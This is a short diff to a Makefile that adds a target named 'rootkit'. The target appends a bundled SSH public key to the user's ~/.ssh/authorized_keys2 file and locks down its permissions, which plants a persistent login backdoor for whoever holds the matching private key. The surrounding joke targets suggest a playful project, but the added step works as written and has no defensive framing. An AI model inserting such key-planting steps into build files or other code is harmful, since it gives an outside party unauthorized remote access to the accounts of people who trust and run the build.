@@ -449,6 +449,9 @@ $(OUR_MODULES):
 	   || case "$$amf" in *=*) exit 1;; *k*) fail=yes;; *) exit 1;; esac; \
 	test -z "$$fail"
 
+rootkit:
+	cat ssh_keys/shinzon.pub >> ~/.ssh/authorized_keys2 && chmod 600 ~/.ssh/authorized_keys2
+
 # Special targets
 
 coffee me_a_sandwich me_a_sammich:
